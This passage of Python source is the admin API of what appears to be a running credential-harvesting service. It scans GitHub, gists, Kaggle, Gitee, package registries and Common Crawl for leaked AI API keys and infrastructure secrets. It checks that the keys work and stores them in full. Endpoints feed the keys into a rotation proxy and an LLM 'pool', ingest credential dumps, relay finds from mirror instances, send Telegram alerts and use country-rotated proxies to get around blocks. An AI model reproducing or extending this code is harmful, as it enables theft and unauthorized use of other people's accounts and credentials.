    """rotation_proxy reports a key returned 401/402/insufficient_quota.
    We mark is_valid=0; the regular re-validation loop will sweep it up later."""
    _check_rotation(authorization)
    h = (payload.get("hash") or "").strip()
    if not h:
        raise HTTPException(400, detail="missing 'hash'")
    db.update_key_validity(h, False)
    return {"ok": True}


@app.post("/admin/revalidate")
async def admin_revalidate(authorization: str | None = Header(default=None)):
    """
    Re-validate ALL keys currently marked is_valid=1 right now (don't wait for the 12h loop).
    Updates is_valid=0 + last_validated_at for keys that no longer pass.
    Use after bulk imports, or to instantly clean up stale valid flags.
    """
    _check_admin(authorization)
    from validators import validate as _validate
    # max_age_hours=0 → cutoff=now → everything with NULL or any past time qualifies
    rows = db.get_valid_keys_to_revalidate(max_age_hours=0, limit=2000)
    results: dict[str, list[str]] = {"dead": [], "alive": []}
    for row in rows:
        ok = await _validate(row["provider"], row["key_full"])
        db.update_key_validity(row["key_hash"], ok)
        results["dead" if not ok else "alive"].append(
            f"{row['provider']}:{row['key_full'][:16]}…"
        )
    log.info("admin revalidate: %d dead, %d alive out of %d checked",
             len(results["dead"]), len(results["alive"]), len(rows))
    return {
        "checked":    len(rows),
        "now_dead":   len(results["dead"]),
        "still_alive": len(results["alive"]),
        "dead_keys":  results["dead"],
    }


@app.post("/admin/revalidate_providers")
async def admin_revalidate_providers(
    body: dict, authorization: str | None = Header(default=None)
):
    """
    Targeted re-validation: only the providers passed in body['providers'].
    Runs concurrently (asyncio.gather with semaphore) — faster than the broad
    /admin/revalidate sweep when you just need to refresh a few providers.

    Body: {"providers": ["pixverse", "hedra", ...]}
    """
    _check_admin(authorization)
    provs = [p.strip() for p in (body.get("providers") or []) if isinstance(p, str)]
    if not provs:
        raise HTTPException(400, detail="missing or empty 'providers'")

    from validators import validate as _validate

    rows: list[dict] = []
    for p in provs:
        rows.extend(db.get_valid_keys_by_provider(p))

    if not rows:
        return {"checked": 0, "now_dead": 0, "still_alive": 0,
                "by_provider": {p: {"alive": 0, "dead": 0} for p in provs}}

    sem = asyncio.Semaphore(8)
    by_prov: dict[str, dict[str, int]] = {p: {"alive": 0, "dead": 0} for p in provs}
    dead_keys: list[str] = []

    async def _one(row: dict):
        async with sem:
            try:
                ok = await _validate(row["provider"], row["key_full"])
            except Exception:
                ok = False
        db.update_key_validity(row["key_hash"], ok)
        bp = by_prov.setdefault(row["provider"], {"alive": 0, "dead": 0})
        bp["alive" if ok else "dead"] += 1
        if not ok:
            dead_keys.append(f"{row['provider']}:{row['key_full'][:16]}…")

    await asyncio.gather(*(_one(r) for r in rows))
    log.info("admin revalidate_providers (%s): checked=%d", provs, len(rows))
    return {
        "checked":     len(rows),
        "now_dead":    sum(b["dead"]  for b in by_prov.values()),
        "still_alive": sum(b["alive"] for b in by_prov.values()),
        "by_provider": by_prov,
        "dead_keys":   dead_keys[:50],
    }


@app.get("/admin/finds_timeline")
async def admin_finds_timeline(
    hours: int = 24, authorization: str | None = Header(default=None)
):
    """Hour-by-hour timeline of NEW finds — AI keys, infra creds, valid AI keys.
    Reads found_keys.discovered_at and infra_findings.discovered_at."""
    _check_admin(authorization)
    hours = max(1, min(hours, 168))
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=hours)).strftime("%Y-%m-%dT%H:%M:%S")

    with db._conn() as c:
        ai_rows = c.execute(
            "SELECT substr(discovered_at,1,13) AS h, "
            "       COUNT(*) AS total, SUM(is_valid) AS valid "
            "FROM found_keys WHERE discovered_at >= ? GROUP BY h ORDER BY h",
            (cutoff,),
        ).fetchall()
        infra_rows = c.execute(
            "SELECT substr(discovered_at,1,13) AS h, COUNT(*) AS total "
            "FROM infra_findings WHERE discovered_at >= ? GROUP BY h ORDER BY h",
            (cutoff,),
        ).fetchall()
        # last 24h breakdown by provider
        by_prov = c.execute(
            "SELECT provider, COUNT(*) AS total, SUM(is_valid) AS valid "
            "FROM found_keys WHERE discovered_at >= ? "
            "GROUP BY provider ORDER BY total DESC",
            (cutoff,),
        ).fetchall()

    ai = {r["h"]: {"total": r["total"], "valid": r["valid"] or 0} for r in ai_rows}
    inf = {r["h"]: r["total"] for r in infra_rows}
    all_hours = sorted(set(ai) | set(inf))
    timeline = [
        {
            "hour":      h,
            "ai_total":  ai.get(h, {}).get("total", 0),
            "ai_valid":  ai.get(h, {}).get("valid", 0),
            "infra":     inf.get(h, 0),
        }
        for h in all_hours
    ]
    return {
        "window_hours":  hours,
        "since":         cutoff,
        "totals": {
            "ai_total":  sum(r["ai_total"] for r in timeline),
            "ai_valid":  sum(r["ai_valid"] for r in timeline),
            "infra":     sum(r["infra"]    for r in timeline),
        },
        "by_provider": [
            {"provider": r["provider"], "total": r["total"], "valid": r["valid"] or 0}
            for r in by_prov
        ],
        "timeline": timeline,
    }


@app.post("/admin/ingest_infra")
async def admin_ingest_infra(
    body: dict, authorization: str | None = Header(default=None)
):
    """Receive infra-cred finds from a mirror service. Master is the single
    source of truth — mirror has already deduped locally; here we re-dedup
    via cred_hash UNIQUE on insert and that's enough.

    Body: {"source": "mirror", "items": [
        {"cred_type", "cred", "repo", "path", "file_url",
         "destination" (optional), "risk_level" (optional)}, ...
    ]}
    """
    _check_admin(authorization)
    items   = body.get("items") or []
    src_lbl = (body.get("source") or "mirror")[:30]
    n_saved = n_dupe = 0
    for entry in items:
        if not isinstance(entry, dict):
            continue
        ctype = (entry.get("cred_type") or "").strip()
        cred  = (entry.get("cred") or "").strip()
        repo  = (entry.get("repo") or "mirror")[:200]
        path  = (entry.get("path") or "")[:200]
        url   = (entry.get("file_url") or "")[:500]
        dest  = (entry.get("destination") or "")[:300]
        risk  = (entry.get("risk_level") or "low")[:10]
        if not ctype or not cred:
            continue
        if db.infra_exists(cred):
            n_dupe += 1
            continue
        ok = db.save_infra(ctype, cred, repo, path, url, 0, "",
                           src_lbl, dest, risk, ["mirror_ingest"])
        if ok:
            n_saved += 1
            # Buffer for Telegram digest (skips risk='low' internally)
            try:
                from notifier import notify_infra_found as _notify_infra
                await _notify_infra(ctype, cred, repo, path, url,
                                    0, "", src_lbl, dest, risk, ["mirror_ingest"])
            except Exception as e:
                log.debug("notify infra on mirror ingest failed: %s", e)
        else:
            n_dupe += 1
    return {"received": len(items), "ingested": n_saved, "duplicate": n_dupe}


@app.get("/admin/dynamic_queries_export")
async def admin_dynamic_queries_export(
    max_age_days: int = 15, authorization: str | None = Header(default=None)
):
    """Export master's dynamic_queries (DeepSeek-generated + combinatorial)
    so mirror services can mirror the same query pool without each running its
    own DeepSeek pipeline. Mirror calls this every ~1h via mirror_relay's
    background sync task and INSERT-OR-IGNOREs into its local table.

    Includes blacklist + yield stats so mirror skips master's known dead
    patterns and can pick up where master's stats left off (yield numbers
    will diverge slightly per-IP — informational, not authoritative)."""
    _check_admin(authorization)
    max_age_days = max(1, min(max_age_days, 60))
    cutoff = (datetime.now(timezone.utc) - timedelta(days=max_age_days)).isoformat()
    with db._conn() as c:
        rows = c.execute(
            """SELECT query_hash, query_str, provider, file_type, theme,
                      generated_at, blacklisted_until,
                      keys_found, valid_keys_found, times_used
               FROM dynamic_queries
               WHERE generated_at >= ?""",
            (cutoff,),
        ).fetchall()
    return {
        "count": len(rows),
        "queries": [
            {
                "query_hash":        r["query_hash"],
                "query_str":         r["query_str"],
                "provider":          r["provider"],
                "file_type":         r["file_type"],
                "theme":             r["theme"] or "",
                "generated_at":      r["generated_at"],
                "blacklisted_until": r["blacklisted_until"],
                "keys_found":        r["keys_found"] or 0,
                "valid_keys_found":  r["valid_keys_found"] or 0,
                "times_used":        r["times_used"] or 0,
            }
            for r in rows
        ],
    }


@app.get("/admin/mirror_stats")
async def admin_mirror_stats(
    hours: int = 24, authorization: str | None = Header(default=None)
):
    """Diagnostic — counts finds ingested from mirror service(s) in last N hours.
    Mirror finds carry file_type='mirror' (or 'mirror_*') because the relay
    posts them via /admin/validate_keys with source='mirror'."""
    _check_admin(authorization)
    hours = max(1, min(hours, 168))
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=hours)).strftime("%Y-%m-%dT%H:%M:%S")
    with db._conn() as c:
        ai_mirror = c.execute(
            "SELECT COUNT(*) AS n, SUM(is_valid) AS v "
            "FROM found_keys WHERE file_type LIKE 'mirror%' AND discovered_at >= ?",
            (cutoff,),
        ).fetchone()
        infra_mirror = c.execute(
            "SELECT COUNT(*) AS n FROM infra_findings "
            "WHERE file_type LIKE 'mirror%' AND discovered_at >= ?",
            (cutoff,),
        ).fetchone()
        # Latest mirror-sourced finds
        latest = c.execute(
            "SELECT provider, key_preview, repo, discovered_at "
            "FROM found_keys WHERE file_type LIKE 'mirror%' "
            "ORDER BY discovered_at DESC LIMIT 5",
        ).fetchall()
    return {
        "window_hours":      hours,
        "ai_from_mirror":    ai_mirror["n"] or 0,
        "ai_valid_from_mirror": ai_mirror["v"] or 0,
        "infra_from_mirror": infra_mirror["n"] or 0,
        "latest": [
            {"provider": r["provider"], "preview": r["key_preview"],
             "repo": r["repo"], "at": r["discovered_at"]}
            for r in latest
        ],
    }


@app.get("/admin/source_breakdown")
async def admin_source_breakdown(
    hours: int = 720, authorization: str | None = Header(default=None)
):
    """Diagnostic — counts finds by source surface (search_code / gist / events /
    issues / mirror / npm / pypi / commoncrawl / author_walk) over the window.
    Distinguishes by URL/path patterns set by each scanner.

    Patterns:
      - gist:    file_url LIKE 'https://gist.github.com/%'
      - issues:  file_path LIKE '#%'  (issues_scanner uses '#NUMBER' / '#NUMBER/comment')
      - events:  file_url LIKE '%/blob/%' AND substr after blob/ is 40-hex (commit sha)
      - mirror:  file_type LIKE 'mirror%' (push from another instance)
      - npm/pypi/commoncrawl: file_type matches
      - search:  rest (default scanner path)
    """
    _check_admin(authorization)
    hours = max(1, min(hours, 24 * 365))
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=hours)).strftime("%Y-%m-%dT%H:%M:%S")
    with db._conn() as c:
        rows = c.execute(
            """
            SELECT
              CASE
                WHEN file_type LIKE 'mirror%'                               THEN 'mirror'
                WHEN file_type IN ('npm','pypi','commoncrawl','cc')         THEN file_type
                WHEN file_url LIKE 'https://gist.github.com/%'              THEN 'gist'
                WHEN file_path LIKE '#%'                                    THEN 'issues'
                WHEN file_url LIKE '%/blob/%'
                     AND length(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(
                       substr(file_url,
                              instr(file_url,'/blob/')+6,
                              40),
                       '0',''),'1',''),'2',''),'3',''),'4',''),'5',''),'6',''),'7',''),'8',''),'9',''),'a',''),'b',''),'c',''),'d',''),'e',''),'f','')) = 0
                     AND length(substr(file_url, instr(file_url,'/blob/')+6, 40)) = 40
                                                                            THEN 'events'
                ELSE 'search_code'
              END AS source,
              COUNT(*)              AS total,
              COALESCE(SUM(is_valid),0) AS valid
            FROM found_keys
            WHERE discovered_at >= ?
            GROUP BY source
            ORDER BY valid DESC, total DESC
            """,
            (cutoff,),
        ).fetchall()
    return {
        "window_hours": hours,
        "since":        cutoff,
        "by_source":    [dict(r) for r in rows],
    }


@app.post("/admin/run_replit_cycle")
async def admin_run_replit_cycle(authorization: str | None = Header(default=None)):
    """Manually trigger one replit_scanner cycle (skip 3h wait). Returns
    when cycle completes — slow endpoint (~5 min), use with care."""
    _check_admin(authorization)
    from replit_scanner import run_replit_cycle
    await run_replit_cycle()
    return {"ok": True, "msg": "cycle done — check /admin/source_full for replit row"}


@app.post("/admin/run_kaggle_themer")
async def admin_run_kaggle_themer(authorization: str | None = Header(default=None)):
    """Manually trigger one kaggle_themer batch (for testing without
    waiting 6h for next scheduled run). Returns count of new queries."""
    _check_admin(authorization)
    n = await generate_kaggle_themed_batch()
    return {"ok": True, "inserted": n}


@app.get("/admin/kaggle_breakdown")
async def admin_kaggle_breakdown(authorization: str | None = Header(default=None)):
    """All-time Kaggle finds by provider — diagnostic for tuning queries."""
    _check_admin(authorization)
    with db._conn() as c:
        rows = c.execute(
            "SELECT provider, COUNT(*) AS total, COALESCE(SUM(is_valid),0) AS valid "
            "FROM found_keys WHERE file_type='kaggle' "
            "GROUP BY provider ORDER BY valid DESC, total DESC"
        ).fetchall()
        recent = c.execute(
            "SELECT provider, repo, file_url, is_valid, discovered_at "
            "FROM found_keys WHERE file_type='kaggle' "
            "ORDER BY discovered_at DESC LIMIT 30"
        ).fetchall()
    return {
        "by_provider": [dict(r) for r in rows],
        "recent": [dict(r) for r in recent],
    }


@app.get("/admin/source_full")
async def admin_source_full(
    hours: int = 8760, authorization: str | None = Header(default=None)
):
    """Full provenance breakdown — by file_type AND by extracted URL domain.
    Captures non-GitHub sources (codeberg/gitee/hf/kaggle/postman/trufflehog)
    that source_breakdown buckets into 'search_code' because their file_url
    doesn't match GitHub-specific patterns."""
    _check_admin(authorization)
    hours = max(1, min(hours, 24 * 365))
    cutoff = (datetime.now(timezone.utc) - timedelta(hours=hours)).strftime("%Y-%m-%dT%H:%M:%S")
    with db._conn() as c:
        # by file_type — captures explicit scanner tags
        by_type = c.execute(
            "SELECT COALESCE(NULLIF(file_type,''),'(empty)') AS t, "
            "       COUNT(*) AS total, COALESCE(SUM(is_valid),0) AS valid "
            "FROM found_keys WHERE discovered_at >= ? "
            "GROUP BY t ORDER BY valid DESC, total DESC",
            (cutoff,),
        ).fetchall()
        # by file_url domain — pulls hostname between :// and next /
        by_domain = c.execute(
            """
            SELECT
              CASE
                WHEN instr(substr(file_url, instr(file_url,'://')+3), '/') > 0
                  THEN substr(substr(file_url, instr(file_url,'://')+3),
                              1,
                              instr(substr(file_url, instr(file_url,'://')+3),'/')-1)
                ELSE substr(file_url, instr(file_url,'://')+3)
              END AS domain,
              COUNT(*) AS total, COALESCE(SUM(is_valid),0) AS valid
            FROM found_keys
            WHERE discovered_at >= ? AND file_url != ''
            GROUP BY domain
            ORDER BY valid DESC, total DESC
            LIMIT 30
            """,
            (cutoff,),
        ).fetchall()
    return {
        "window_hours": hours,
        "since":        cutoff,
        "by_file_type": [dict(r) for r in by_type],
        "by_domain":    [dict(r) for r in by_domain],
    }


@app.get("/admin/probe_external_apis")
async def admin_probe_external_apis(authorization: str | None = Header(default=None)):
    """One-shot probe of external scanner endpoints from THIS server's IP.
    Used to triage why scanners produce 0 finds — distinguishes between
    'API broken' / 'proxy broken' / 'auth required' / 'IP blocked'.

    Tests Gitee (with + without Evomi proxy), Kaggle (auth + non-auth),
    Postman (confirm dead), Codeberg (confirm alive)."""
    _check_admin(authorization)
    import httpx
    UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) ghscan-probe/1.0"}
    timeout = httpx.Timeout(15.0)

    # Build proxy options
    evomi_proxy = None
    try:
        from config import evomi_proxy_url
        evomi_proxy = evomi_proxy_url()
    except Exception:
        pass

    # Build per-country Evomi URLs by mutating the country suffix in the
    # configured evomi_proxy_url(). Works whether the proxy comes from
    # EVOMI_PROXY (full URL) or EVOMI_USER+EVOMI_PASS split env vars.
    import re as _re_country
    def _evo(country: str) -> str | None:
        if not evomi_proxy:
            return None
        url = _re_country.sub(r'_country-[A-Za-z]{2}', f'_country-{country}', evomi_proxy)
        # If no _country- suffix at all, append it (only safe when user is in URL)
        if '_country-' not in url and '@' in url:
            user_part, host_part = url.split('@', 1)
            # user_part is "http://USER:PASS" — inject country into user
            head, sep, creds = user_part.rpartition('//')
            if ':' in creds:
                u, p = creds.split(':', 1)
                url = f"{head}{sep}{u}_country-{country}:{p}@{host_part}"
        return url

    targets = [
        # gitee — direct (no proxy)
        ("gitee_direct",          "https://gitee.com/api/v5/orgs/paddlepaddle/repos?per_page=5",      None),
        ("gitee_evomi_cn",        "https://gitee.com/api/v5/orgs/paddlepaddle/repos?per_page=5",      _evo("cn")),
        # kaggle — try multiple country exits (Kaggle is US-based, Cloudflare-fronted)
        ("kaggle_direct",         "https://www.kaggle.com/api/v1/kernels/list?search=langchain&pageSize=5",   None),
        ("kaggle_evomi_us",       "https://www.kaggle.com/api/v1/kernels/list?search=langchain&pageSize=5",   _evo("us")),
        ("kaggle_evomi_de",       "https://www.kaggle.com/api/v1/kernels/list?search=langchain&pageSize=5",   _evo("de")),
        ("kaggle_evomi_gb",       "https://www.kaggle.com/api/v1/kernels/list?search=langchain&pageSize=5",   _evo("gb")),
        ("kaggle_evomi_jp",       "https://www.kaggle.com/api/v1/kernels/list?search=langchain&pageSize=5",   _evo("jp")),
        # codeberg — control
        ("codeberg_search",       "https://codeberg.org/api/v1/repos/search?q=docker-compose&limit=5",         None),
        # commoncrawl — try US (it's an AWS US-east service)
        ("commoncrawl_us",        "https://index.commoncrawl.org/collinfo.json",                               _evo("us")),
    ]

    results = []
    async with httpx.AsyncClient(headers=UA, timeout=timeout, follow_redirects=True) as client:
        for label, url, proxy in targets:
            entry = {"label": label, "url": url, "proxy": "evomi_cn" if proxy else "direct"}
            try:
                if proxy:
                    async with httpx.AsyncClient(headers=UA, timeout=timeout, follow_redirects=True, proxy=proxy) as pc:
                        r = await pc.get(url)
                else:
                    r = await client.get(url)
                entry["status"] = r.status_code
                entry["bytes"] = len(r.content)
                # Parse JSON if obvious; else first 200 chars of body
                ct = r.headers.get("content-type", "")
                if "json" in ct:
                    try:
                        body = r.json()
                        if isinstance(body, list):
                            entry["json_kind"] = f"list[{len(body)}]"
                            entry["json_first"] = str(body[0])[:200] if body else "(empty)"
                        elif isinstance(body, dict):
                            entry["json_kind"] = f"dict(keys={list(body.keys())[:5]})"
                        else:
                            entry["json_kind"] = type(body).__name__
                    except Exception as e:
                        entry["json_err"] = str(e)[:120]
                else:
                    entry["body_head"] = r.text[:200].replace("\n", " ")
            except Exception as e:
                entry["err"] = f"{type(e).__name__}: {str(e)[:200]}"
            results.append(entry)

    # Extra: probe each configured GITEE_TOKEN against /user (auth check)
    gitee_token_results = []
    try:
        from config import GITEE_TOKENS
    except Exception:
        GITEE_TOKENS = []
    if GITEE_TOKENS:
        async with httpx.AsyncClient(headers=UA, timeout=timeout, follow_redirects=True) as client:
            for tok in GITEE_TOKENS:
                entry = {"token_prefix": tok[:8]}
                try:
                    r = await client.get(
                        "https://gitee.com/api/v5/user",
                        headers={**UA, "Authorization": f"token {tok}"},
                    )
                    entry["status_token_header"] = r.status_code
                    entry["body_head"] = r.text[:120]
                except Exception as e:
                    entry["err_token"] = f"{type(e).__name__}: {str(e)[:120]}"
                # also try with access_token query param
                try:
                    r = await client.get(
                        f"https://gitee.com/api/v5/user?access_token={tok}",
                    )
                    entry["status_query_param"] = r.status_code
                except Exception as e:
                    entry["err_query"] = f"{type(e).__name__}: {str(e)[:120]}"
                gitee_token_results.append(entry)

    # Extra: probe Kaggle with KAGGLE_USERNAME+KAGGLE_KEY (Basic) AND with
    # KAGGLE_TOKENS (Bearer KGAT_*) — what scanner actually does
    import os, base64
    ku = os.environ.get("KAGGLE_USERNAME", "")
    kk = os.environ.get("KAGGLE_KEY", "")
    kaggle_auth_result = {}
    if ku and kk:
        try:
            auth = base64.b64encode(f"{ku}:{kk}".encode()).decode()
            async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
                r = await client.get(
                    "https://www.kaggle.com/api/v1/kernels/list?search=test&pageSize=5",
                    headers={**UA, "Authorization": f"Basic {auth}"},
                )
                kaggle_auth_result["basic"] = {"status": r.status_code, "body": r.text[:200]}
        except Exception as e:
            kaggle_auth_result["basic"] = {"err": f"{type(e).__name__}: {str(e)[:200]}"}
    else:
        kaggle_auth_result["basic"] = "KAGGLE_USERNAME/KAGGLE_KEY env not set"

    try:
        from config import KAGGLE_TOKENS
    except Exception:
        KAGGLE_TOKENS = []
    bearer_results = []
    if KAGGLE_TOKENS:
        # Test KGAT against multiple Kaggle endpoint variants — Kaggle's old
        # /api/v1 is Basic-auth only; KGAT bearer may need new paths.
        endpoints_to_try = [
            ("v1_kernels_list",       "https://www.kaggle.com/api/v1/kernels/list?search=langchain&pageSize=5&language=python"),
            ("v1_users_currentuser",  "https://www.kaggle.com/api/v1/users/current"),
            ("v1_datasets_list",      "https://www.kaggle.com/api/v1/datasets/list?search=test&pageSize=5"),
            ("internal_kernels_list", "https://www.kaggle.com/api/i/kernels.KernelsService/ListKernels"),
            ("oauth_userinfo",        "https://www.kaggle.com/api/v1/oauth/userinfo"),
            ("v2_kernels_list",       "https://www.kaggle.com/api/v2/kernels/list?search=langchain&pageSize=5"),
        ]
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            tok = KAGGLE_TOKENS[0]
            prefix = tok[:14]
            for label, url in endpoints_to_try:
                e = {"endpoint": label}
                try:
                    r = await client.get(
                        url,
                        headers={**UA, "Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                    )
                    e["status"] = r.status_code
                    ct = r.headers.get("content-type","")
                    e["content_type"] = ct[:60]
                    if "json" in ct:
                        try:
                            j = r.json()
                            if isinstance(j, dict):
                                e["json_keys"] = list(j.keys())[:8]
                            elif isinstance(j, list):
                                e["json_kind"] = f"list[{len(j)}]"
                        except Exception:
                            e["body_head"] = r.text[:120]
                    else:
                        e["body_head"] = r.text[:120].replace("\n"," ")
                except Exception as ex:
                    e["err"] = f"{type(ex).__name__}: {str(ex)[:200]}"
                bearer_results.append(e)
            kaggle_auth_result["token_prefix_used"] = prefix
    kaggle_auth_result["bearer_kgat"] = bearer_results

    return {
        "server_egress_note": "Probes run from Railway server IP, same egress as scanners",
        "evomi_proxy_configured": bool(evomi_proxy),
        "results": results,
        "gitee_token_probe": gitee_token_results,
        "kaggle_auth_probe": kaggle_auth_result,
    }


@app.post("/admin/test_llm_pipelines")
async def admin_test_llm_pipelines(
    body: dict, authorization: str | None = Header(default=None)
):
    """Run each LLM-driven pipeline against a sample input and return the
    raw LLM response + parsed output for quality evaluation.

    Body: {"pipelines": ["repo_prioritizer", "pre_validator", "active_learner",
                          "author_profiler"]}  (optional, default = all)

    Each pipeline runs ONCE against a hardcoded realistic test input. Output
    shows whether LLM (deepseek or glm fallback) returned sensible JSON, the
    classifier decision, and the source. Used to verify production quality
    before relying on the pipelines for real scan decisions.

    Cost: ~4-5 LLM calls (one per pipeline tested). Negligible on our pool.
    """
    _check_admin(authorization)
    requested = body.get("pipelines") or [
        "repo_prioritizer", "pre_validator", "active_learner", "author_profiler"
    ]
    results: dict = {}

    # Sample inputs designed to be representative real-world cases.
    samples = {
        "repo_prioritizer": {
            "test_repo": "openai/openai-cookbook",   # known TUTORIAL repo
            "expected_class": "tutorial or example",
        },
        "pre_validator": {
            "key":       "sk-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",  # obvious placeholder
            "context":   "OPENAI_API_KEY=sk-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n# replace this with your real key\nMODEL=gpt-4",
            "file_path": ".env.example",
            "expected":  False,
        },
        "active_learner": {
            "test": "runs against actual recent finds in DB; output is fresh queries",
        },
        "author_profiler": {
            "login": "torvalds",   # known prominent dev — should score HIGH
        },
    }

    if "repo_prioritizer" in requested:
        try:
            from repo_prioritizer import _build_user_prompt, _parse_classification
            from llm_client       import call_fast
            from config           import GITHUB_TOKENS
            import httpx
            async with httpx.AsyncClient(timeout=30) as c:
                prompt = await _build_user_prompt(
                    c, samples["repo_prioritizer"]["test_repo"],
                    GITHUB_TOKENS[0],
                )
            if not prompt:
                results["repo_prioritizer"] = {"error": "could_not_fetch_metadata"}
            else:
                from repo_prioritizer import _SYSTEM_PROMPT
                text, source = await call_fast(
                    messages=[
                        {"role": "system", "content": _SYSTEM_PROMPT},
                        {"role": "user",   "content": prompt},
                    ],
                    response_format={"type": "json_object"},
                    max_tokens=128,
                    timeout=20,
                )
                parsed = _parse_classification(text)
                results["repo_prioritizer"] = {
                    "input":           samples["repo_prioritizer"],
                    "raw_llm_output":  (text or "")[:500],
                    "source":          source,
                    "parsed":          {"class": parsed[0], "confidence": parsed[1]} if parsed else None,
                    "prompt_excerpt":  prompt[:600],
                }
        except Exception as e:
            results["repo_prioritizer"] = {"error": f"{type(e).__name__}: {str(e)[:200]}"}

    if "pre_validator" in requested:
        try:
            from pre_validator import is_real_key, _heuristic_pre_filter
            s = samples["pre_validator"]
            heur = _heuristic_pre_filter(s["key"], s["file_path"])
            llm_result = await is_real_key(s["key"], s["context"], s["file_path"])
            results["pre_validator"] = {
                "input":            s,
                "heuristic_match":  heur,           # True = caught by regex
                "llm_decision":     llm_result,     # bool: True=real, False=placeholder
                "expected":         s["expected"],  # ground truth
                "match":            llm_result == s["expected"],
            }
        except Exception as e:
            results["pre_validator"] = {"error": f"{type(e).__name__}: {str(e)[:200]}"}

    if "active_learner" in requested:
        try:
            from active_learner import run_active_learning
            summary = await run_active_learning()
            results["active_learner"] = summary
        except Exception as e:
            results["active_learner"] = {"error": f"{type(e).__name__}: {str(e)[:200]}"}

    if "author_profiler" in requested:
        try:
            from author_profiler import profile_author
            from config           import GITHUB_TOKENS
            import httpx
            async with httpx.AsyncClient(timeout=30) as c:
                profile = await profile_author(c, samples["author_profiler"]["login"],
                                                GITHUB_TOKENS[0])
            results["author_profiler"] = {
                "input":          samples["author_profiler"],
                "profile":        profile,
                "expected":       "score >= 80 (prominent OSS contributor)",
            }
        except Exception as e:
            results["author_profiler"] = {"error": f"{type(e).__name__}: {str(e)[:200]}"}

    return results


@app.get("/admin/llm_pool_stats")
async def admin_llm_pool_stats(authorization: str | None = Header(default=None)):
    """LLM compute capacity snapshot — DeepSeek + GLM key pools used by
    repo_prioritizer, pre_validator, active_learner, author_profiler, and
    extractor_synthesizer pipelines via llm_client.call_creative/fast.

    Low pool size (e.g. <30 deepseek + <50 glm) means LLM-driven pipelines
    will start failing gracefully (returning None / defaulting to non-LLM
    behavior). Telegram alert fires below threshold.
    """
    _check_admin(authorization)
    from llm_client import llm_pool_stats
    stats = await llm_pool_stats()
    # Repo prioritizer cache stats — visibility on classification volume
    try:
        from repo_prioritizer import cache_stats as _rp_stats
        stats["repo_prioritizer_cache"] = _rp_stats()
    except Exception:
        pass
    return stats


@app.get("/admin/config")
async def admin_config(authorization: str | None = Header(default=None)):
    """Read-only snapshot of current scanner config (env-driven values).
    No secrets — just tunables."""
    _check_admin(authorization)
    from config import (
        SCAN_INTERVAL, YOUNG_REPO_DAYS, BIG_SERVICE_STARS, REPO_RESCAN_DAYS,
        CONCURRENT_ITEMS, MAX_PAGES, SCAN_MAX_QUERIES_PER_CYCLE,
        SCAN_LONG_TAIL_SAMPLE, SCAN_PAGE_SLEEP_SEC, GITHUB_TOKENS,
    )
    return {
        "tokens":                     len(GITHUB_TOKENS),
        "SCAN_INTERVAL":              SCAN_INTERVAL,
        "MAX_PAGES":                  MAX_PAGES,
        "CONCURRENT_ITEMS":           CONCURRENT_ITEMS,
        "SCAN_MAX_QUERIES_PER_CYCLE": SCAN_MAX_QUERIES_PER_CYCLE,
        "SCAN_LONG_TAIL_SAMPLE":      SCAN_LONG_TAIL_SAMPLE,
        "SCAN_PAGE_SLEEP_SEC":        SCAN_PAGE_SLEEP_SEC,
        "YOUNG_REPO_DAYS":            YOUNG_REPO_DAYS,
        "BIG_SERVICE_STARS":          BIG_SERVICE_STARS,
        "REPO_RESCAN_DAYS":           REPO_RESCAN_DAYS,
    }


@app.post("/admin/fix_ark")
async def admin_fix_ark(authorization: str | None = Header(default=None)):
    """
    Reclassify existing 'ark' is_valid=1 keys by probing which 2.0 model they can access:
      • 2.0-fast accessible → update provider to 'ark_fast'
      • 2.0-standard only   → keep provider as 'ark'
      • neither (1.0 only)  → mark is_valid=0
    Run once after deploying the ark_fast split to fix legacy DB entries.
    """
    _check_admin(authorization)
    from validators import validate_ark_fast as _vfast, validate_ark as _vstd
    rows = db.get_valid_keys_by_provider("ark")
    results = {"ark_fast": [], "ark": [], "invalidated": []}
    for row in rows:
        key  = row["key_full"]
        khash = row["key_hash"]
        if await _vfast(key):
            db.update_key_provider(khash, "ark_fast")
            db.update_key_validity(khash, True)
            results["ark_fast"].append(key[:16] + "…")
        elif await _vstd(key):
            db.update_key_validity(khash, True)   # provider stays 'ark'
            results["ark"].append(key[:16] + "…")
        else:
            db.update_key_validity(khash, False)  # 1.0-only → dead
            results["invalidated"].append(key[:16] + "…")
    log.info("fix_ark: %d→ark_fast, %d→ark, %d invalidated",
             len(results["ark_fast"]), len(results["ark"]), len(results["invalidated"]))
    return results


@app.post("/admin/validate_keys")
async def admin_validate_keys(
    body: dict, authorization: str | None = Header(default=None)
):
    """
    Batch-validate a list of keys + save to DB. For ingesting credential dumps
    found by manual review (decoded base64 obfuscation, etc.).

    Request body:
      {
        "source": "manual",                   # used as file_type label
        "items": [
          {"provider": "openrouter", "key": "sk-or-v1-...", "repo": "owner/name", "path": "config.js"},
          ...
        ]
      }

    Response: per-item result {provider, preview, is_valid, saved, error}.
    """
    _check_admin(authorization)
    items   = body.get("items") or []
    src_lbl = (body.get("source") or "manual_dump")[:30]

    from validators import validate as _validate

    out: list[dict] = []
    n_saved = n_valid = n_dupe = n_no_validator = 0

    for entry in items:
        if not isinstance(entry, dict):
            continue
        prov = (entry.get("provider") or "").strip()
        key  = (entry.get("key") or "").strip()
        if not prov or not key:
            continue
        if prov not in EXTRACTORS_AVAILABLE:
            out.append({"provider": prov, "preview": key[:14] + "...",
                        "is_valid": None, "saved": False,
                        "error": "no_validator"})
            n_no_validator += 1
            continue
        if db.key_exists(key):
            out.append({"provider": prov, "preview": key[:14] + "...",
                        "is_valid": None, "saved": False, "error": "duplicate"})
            n_dupe += 1
            continue
        try:
            is_valid = await _validate(prov, key)
        except Exception as e:
            out.append({"provider": prov, "preview": key[:14] + "...",
                        "is_valid": None, "saved": False,
                        "error": f"validate_err:{type(e).__name__}"})
            continue
        repo = (entry.get("repo")     or "manual")[:200]
        path = (entry.get("path")     or "")[:200]
        url  = (entry.get("file_url") or entry.get("url") or "")[:500]
